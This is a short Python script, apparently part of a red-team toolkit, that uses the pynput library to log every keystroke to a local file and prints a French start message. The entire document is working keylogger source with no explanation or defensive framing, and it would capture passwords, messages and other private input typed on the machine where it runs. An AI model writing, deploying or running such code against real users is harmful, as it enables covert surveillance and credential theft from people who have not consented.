#!/usr/bin/env python3
from pynput import keyboard
import os

LOG_FILE = "/opt/redteam_tool/keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Keylogger error: {e}")

def start_keylogger():
    print("[*] Keylogger démarré...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    start_keylogger()
